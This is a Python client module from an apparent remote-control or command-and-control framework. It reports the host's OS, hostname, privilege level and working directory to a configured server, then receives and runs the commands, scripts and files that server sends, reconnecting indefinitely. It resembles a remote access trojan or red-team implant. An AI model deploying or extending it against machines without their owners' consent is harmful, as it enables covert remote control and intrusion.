import os
import platform
import queue
import socket
import sys
import threading
import time
import uuid

from client.config.config import SERVER_ADDR, RECONNECT_INTERVAL_SECONDS
from core.utils.client_util import check_privilege
from client.connection.server_connection import ServerConnection
from core.utils.logger import logger


class Client:
    RECONNECT_INTERVAL = RECONNECT_INTERVAL_SECONDS

    def __init__(self, address):
        self.address = address
        self.client_id = str(uuid.uuid4())
        self.server = None

        self._receiver_thread = None
        self._receiver_stop_event = threading.Event()
        self._receiver_error = None
        self._receiver_error_lock = threading.Lock()

        self._create_connection()

    def _create_connection(self):
        """
        创建一个新的服务端连接对象
        """
        self.server = ServerConnection()
        self.server.client_id = self.client_id

    def _close_current_connection(self):
        """
        关闭当前连接
        """
        try:
            self.server.close()
        except Exception:
            pass

    def _clear_receiver_error(self):
        with self._receiver_error_lock:
            self._receiver_error = None

    def _set_receiver_error(self, error):
        with self._receiver_error_lock:
            if self._receiver_error is None:
                self._receiver_error = error

    def _pop_receiver_error(self):
        with self._receiver_error_lock:
            error = self._receiver_error
            self._receiver_error = None
            return error

    def _stop_receiver_thread(self):
        """
        停止接收线程
        """
        self._receiver_stop_event.set()

    def _reset_receiver_runtime(self):
        """
        重置接收线程运行态
        """
        self._receiver_stop_event = threading.Event()
        self._clear_receiver_error()
        self._receiver_thread = None

    def _reset_connection(self):
        """
        关闭当前连接并重建连接对象
        """
        self._stop_receiver_thread()
        self._close_current_connection()
        self._handle_connection_lost()
        self._reset_receiver_runtime()
        self._create_connection()

    def _build_client_info(self):
        """
        构造客户端基础信息
        """
        command_manifest = []
        try:
            commands = self.server.command_executor.get_commands()
            if hasattr(commands, 'get_command_manifest_payload'):
                command_manifest = commands.get_command_manifest_payload()
        except Exception:
            command_manifest = []

        return {
            'id': self.client_id,
            'type': 'info',
            'os_type': platform.system(),
            'os_ver': platform.platform(),
            'hostname': socket.gethostname(),
            'integrity': check_privilege(),
            'cwd': os.getcwd(),
            'command_manifest': command_manifest,
        }

    def _connect_socket(self):
        """
        建立到底层服务端的连接；失败时持续重试
        """
        logger.info(f'Connecting to {self.address}')

        while not self.server.connect(self.address):
            time.sleep(self.RECONNECT_INTERVAL)
            print('Attempting to reconnect...')
            self._create_connection()

    def _handshake(self):
        """
        连接建立后发送客户端握手信息
        """
        info = self._build_client_info()
        self.server.send(info)
        self.server.mark_connected()
        logger.info('Connected')

    def _handle_receiver_message(self, data: dict):
        """
        后台接收线程处理消息：
        - rdy: 直接分发到 ready_queue
        - file: 由接收线程完整处理（必须由同一线程继续 recv_io）
        - command/script: 交给主线程执行
        """
        message_type = data.get('type')

        if message_type == 'rdy':
            self.server.enqueue_received_message(data)
            return

        if message_type == 'file':
            result = self.server.message_router.dispatch(data)
            if result:
                self.server.send_result(*result)
            return

        self.server.enqueue_received_message(data)

    def _receiver_loop(self):
        """
        后台接收线程：
        - 持续 recv 收包
        - rdy 直接进入 ready_queue
        - file 由本线程完整接收文件体，避免与主线程抢读 socket
        - command/script 进入待处理队列，由主线程执行
        """
        while not self._receiver_stop_event.is_set():
            try:
                data = self.server.recv()
                logger.debug(data)
                self._handle_receiver_message(data)
            except socket.error as e:
                if not self._receiver_stop_event.is_set():
                    self._set_receiver_error(e)
                break
            except Exception as e:
                if not self._receiver_stop_event.is_set():
                    self._set_receiver_error(e)
                break

    def _start_receiver_thread(self):
        """
        启动后台接收线程
        """
        self._receiver_stop_event.clear()
        self._clear_receiver_error()

        self._receiver_thread = threading.Thread(
            target=self._receiver_loop,
            name='ClientReceiver',
            daemon=True
        )
        self._receiver_thread.start()

    def connect(self):
        """
        建立连接并完成握手
        """
        self._connect_socket()
        self._handshake()
        self._start_receiver_thread()

    def _recover_from_connection_error(self, error):
        """
        连接异常后的恢复逻辑
        """
        logger.error(error, exc_info=True)
        self._reset_connection()
        self.connect()

    def wait(self):
        while True:
            try:
                receiver_error = self._pop_receiver_error()
                if receiver_error is not None:
                    raise receiver_error

                result = self.server.recv_command(timeout=0.5)
                if result:
                    self.server.send_result(*result)
            except queue.Empty:
                continue
            except SystemExit:
                logger.info('Server closed this connection')
                break
            except socket.error as e:
                self._recover_from_connection_error(e)
            except Exception as e:
                self._recover_from_connection_error(e)

    def _handle_connection_lost(self):
        """
        连接断开时的统一清理逻辑：
        - 先标记连接失效
        - 停掉所有后台任务
        - 清掉旧连接运行态
        """
        try:
            self.server.mark_disconnected()
        except Exception:
            pass

        try:
            stopped_jobs = self.server.job_manager.handle_connection_lost()
            if stopped_jobs:
                logger.info(f'Stopped background jobs after connection loss: {stopped_jobs}')
        except Exception as e:
            logger.error(f'Failed to stop background jobs after connection loss: {e}', exc_info=True)

        try:
            self.server.reset_runtime_state()
        except Exception as e:
            logger.error(f'Failed to reset runtime state after connection loss: {e}', exc_info=True)


if __name__ == '__main__':
    client = Client(SERVER_ADDR)
    try:
        client.connect()
        client.wait()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(e, exc_info=True)